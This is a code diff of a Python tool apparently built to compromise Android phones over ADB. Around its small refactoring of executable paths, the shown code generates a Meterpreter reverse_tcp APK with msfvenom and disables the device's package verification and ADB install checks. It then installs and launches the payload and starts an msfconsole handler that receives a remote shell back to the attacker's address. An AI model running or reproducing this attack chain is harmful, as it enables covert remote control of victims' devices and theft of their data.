@@ -4,7 +4,7 @@ from pathlib import Path
 
 from modules.config import AppConfig
 from modules import banner
-from modules.console import console, confirm, adb, task_status
+from modules.console import console, confirm, adb, task_status, get_adb_executable
 from modules.connection import get_ip_address, is_valid_ipv4
 
 
@@ -60,10 +60,13 @@ def hack(config: AppConfig) -> None:
     console.print(banner.hacking_banner)
 
     apk_out = Path("test.apk")
+    msfvenom = config.msfvenom_path or "msfvenom"
+    msfconsole = config.msfconsole_path or "msfconsole"
+
     with task_status("[info]msfvenom: building APK…[/info]"):
         result = subprocess.run(
             [
-                "msfvenom",
+                msfvenom,
                 "-p",
                 "android/meterpreter/reverse_tcp",
                 f"LHOST={ip}",
@@ -86,8 +89,9 @@ def hack(config: AppConfig) -> None:
         adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"])
         adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"])
 
+    adb_exe = get_adb_executable()
     with task_status("[info]adb install payload…[/info]"):
-        subprocess.run(["adb", "install", "-r", str(apk_out)])
+        subprocess.run([adb_exe or "adb", "install", "-r", str(apk_out)])
 
     with task_status("[info]Launching payload…[/info]"):
         adb(["shell", "monkey", "-p", "com.metasploit.stage", "1"])
@@ -99,7 +103,7 @@ def hack(config: AppConfig) -> None:
     console.print("[red]Starting msfconsole handler…[/red]")
     subprocess.run(
         [
-            "msfconsole",
+            msfconsole,
             "-x",
             f"use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; "
             f"set LHOST {ip} ; set LPORT {lport} ; exploit",
